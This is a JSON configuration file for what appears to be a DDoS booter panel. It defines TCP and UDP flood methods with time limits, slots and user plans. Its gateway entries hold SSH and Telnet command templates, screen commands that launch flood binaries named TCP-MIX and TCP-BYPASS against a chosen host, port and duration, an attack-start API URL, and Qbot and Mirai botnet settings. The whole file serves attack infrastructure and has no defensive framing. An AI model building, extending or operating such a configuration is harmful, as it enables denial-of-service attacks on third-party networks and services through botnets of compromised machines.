{
  "Methods": [
    {
      "Name": "TCP",
      "Type": "Layer4",
      "Time": 120,
      "Slots": 2,
      "ASN": [],
      "Plan": [
        "User"
      ],
      "Gateways": {
        "SSHCmd": [
          {
            "Succ": "TCP [host] [port] [time]"
          },
          {
            "Revive": "TCP [host] [port] [time]"
          }
        ],
        "TelnetCmd": [
          {
            "TestNet": "TCP [host] [port] [time]"
          }
        ],
        "CMDs": [
          {
            "Count": 3,
            "Command": "screen -dmS TCP-MIX ./TCP-MIX [host] [port] [threads] [time] -1"
          },
          {
            "Count": 1,
            "Command": "screen -dmS DNS ./TCP-BYPASS [host] [port] [threads] [time]"
          }
        ],
        "APIs": [
          "https://example.com/api/start?host=[host]&port=[port]&time=[time]&username=XXX&key=GGs&method=UDP"
        ],
        "Qbot": {
          "Command": "",
          "Bots": 0
        },
        "Mirai": {
          "PortFlag": 0,
          "MethodFlag": 0,
          "LenFlag": 0,
          "Bots": 0
        }
      }
    },
    {
      "Name": "UDP",
      "Type": "Layer4",
      "Time": 120,
      "Slots": 4,
      "ASN": [],
      "Plan": [
        "User"
      ],
      "Gateways": {
        "SSHCmd": [
          {
            "Succ": "udp [host] [port] [time]"
          }
        ],
        "TelnetCmd": [
        ],
        "CMDs": [
          {
            "Count": 1,
            "Command": "screen -dmS TCP-MIX ./TCP-MIX [host] [port] [threads] [time] -1"
          }
        ],
        "APIs": [
          "https://example.com/api/start?host=[host]&port=[port]&time=[time]&username=XXX&key=GGs&method=UDP"
        ],
        "Qbot": {
          "Command": "",
          "Bots": 0
        },
        "Mirai": {
          "PortFlag": 0,
          "MethodFlag": 0,
          "LenFlag": 0,
          "Bots": 0
        }
      }
    }
  ]
}